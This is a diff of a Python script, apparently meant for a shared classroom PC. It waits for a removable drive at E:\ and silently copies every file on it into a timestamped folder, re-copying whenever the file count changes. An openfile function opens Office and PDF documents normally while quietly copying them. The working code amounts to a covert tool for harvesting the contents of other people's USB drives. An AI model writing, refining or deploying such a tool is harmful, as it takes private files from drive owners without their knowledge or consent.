@@ -48,56 +48,53 @@ def main():
     
     root.after(1000,main)
 """
-def upan():
+def upan(): #※不可在Linux下测试
     global TARGET
     while not os.path.exists('E:\\'):
         time.sleep(60)
     os.chdir('E:\\')
-    TARGET = os.path.join(TARGET,str(time.time()))  #!未测试
+    TARGET = os.path.join(TARGET,time.strftime('%Y%m%d%H%M%S'))
     os.mkdir(TARGET)
-    filelst = os.walk('.')
+    copy('.',TARGET)
+def openfile(filename:str):
+    '''打开文件并复制
+filename(str):文件名
+'''
+    file_suffix = os.path.splitext(filename)[-1][1:]
+    if file_suffix in ('doc','docx'):
+        threading.Thread(target=lambda:os.system(f'start winword {filename}')).start()
+        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+        sys.exit()
+    elif file_suffix in ('ppt','pptx'):
+        threading.Thread(target=lambda:os.system(f'start powerpnt {filename}')).start()
+        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+        sys.exit()
+    elif file_suffix in ('xls','xlsx'):
+        threading.Thread(target=lambda:os.system(f'start excel {filename}')).start()
+        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+        sys.exit()
+    elif file_suffix in ('pdf',):
+        threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
+        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+def copy(path:str,target:str):
+    '''复制目录下所有文件
+path(str):目录路径
+target(str):目标路径'''
+    filelst = os.walk(path)
     for i in filelst:
         for j in i[2]:
-            filename = os.path.join(i[0],j)
-            if '.lnk' not in filename:    #排除.lnk文件
-                target = os.path.join(TARGET,j)
-                shutil.copy(filename,target)
-                print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
-def openfile(filename:str):
-    '''
-'''
-        file_suffix = os.path.splitext[-1][1:]  #!未测试
-        if file_suffix in ('doc','docx'):
-            threading.Thread(target=lambda:os.system(f'start winword {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('ppt','pptx'):
-            threading.Thread(target=lambda:os.system(f'start powerpnt {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('xls','xlsx'):
-            threading.Thread(target=lambda:os.system(f'start excel {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('pdf',):
-            threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-def copy(path:str): #!缩进
-            filelst = os.walk(path)
-            for i in filelst:
-                for j in i[2]:
-                    filename = os.path.join(i[0],j)
-                    if '.lnk' not in filename:    #排除.lnk文件
-                        target = os.path.join(TARGET,j)
-                        shutil.copy(filename,target)
-                        print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
+            filesrc = os.path.join(i[0],j)
+            if '.lnk' not in filesrc:    #排除.lnk文件
+                filetarget = os.path.join(target,j)
+                shutil.copy(filesrc,filetarget)
+                print(f'已复制 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
 
 def main():
     execute_with_arg()
     print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
     while True:
         if is_file_number_change():
-            copy('.')
+            copy('.',TARGET)
         time.sleep(5)
 
 if __name__ == '__main__':
